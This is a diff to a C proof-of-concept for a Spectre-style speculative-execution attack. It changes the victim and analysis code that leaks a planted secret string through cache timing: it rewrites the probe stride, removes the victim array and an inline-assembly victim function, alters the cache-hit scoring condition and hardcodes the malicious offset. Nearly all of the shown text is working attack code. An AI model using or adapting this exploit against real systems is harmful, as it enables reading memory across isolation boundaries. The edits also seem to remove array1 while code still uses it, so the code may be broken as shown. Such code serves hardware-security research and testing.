@@ -12,31 +12,12 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
-#define jump_size 1
+#define jump_size 512
 #define four_k 4096
 #define dont_check 7
 const uint8_t secret_num = 43;
 
 unsigned int array1_size = 16;
-uint8_t unused1[64];
-uint8_t array1[160] = {
-    1,
-    2,
-    3,
-    4,
-    5,
-    6,
-    7,
-    8,
-    9,
-    10,
-    11,
-    12,
-    13,
-    14,
-    15,
-    16};
-uint8_t unused2[64];
 uint8_t array2[256 * jump_size];
 
 char *secret = "The password is rootkea";
@@ -56,29 +37,6 @@ void victim_func(int is_mal, uint8_t value, uint8_t *stored_ptr, uint8_t *stored
   }
 }
 
-void victim_func_asm(int x, int value, int *stored_ptr, int *stored_ptr_mal)
-{
-  int loaded_value;
-  // Store value to memory location
-  __asm__ __volatile__(
-      "movl %0, %%eax\n\t"
-      "movl %%eax, (%1)\n\t"
-      :
-      : "r"(value), "r"(stored_ptr)
-      : "%eax", "memory");
-  if (x < array1_size)
-  {
-    // Load value from memory location + maybe 4K
-    __asm__ __volatile__(
-        "movl (%0), %%eax\n\t"
-        "movl %%eax, %1\n\t"
-        :
-        : "r"(stored_ptr_mal), "r"(loaded_value)
-        : "%eax", "memory");
-    temp &= array2[array1[loaded_value] * jump_size];
-  }
-}
-
 /********************************************************************
 Analysis code
 ********************************************************************/
@@ -92,6 +50,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t *addr;
+  int is_mal;
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
@@ -116,7 +75,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
-      int is_mal;
       // Value to store
       uint8_t value;
       // The location to store is the address of the stored var
@@ -146,7 +104,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
       time1 = __rdtscp(&junk);         /* READ TIMER */
       junk = *addr;                    /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i == secret_num)
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != dont_check)
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -177,7 +135,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 int main(int argc,
          const char **argv)
 {
-  size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
+  size_t malicious_x = (size_t)4064; /* default for malicious_x */
   printf("First offset is %d\n", malicious_x);
   int i, score[2], len = 1;
   uint8_t value[2];
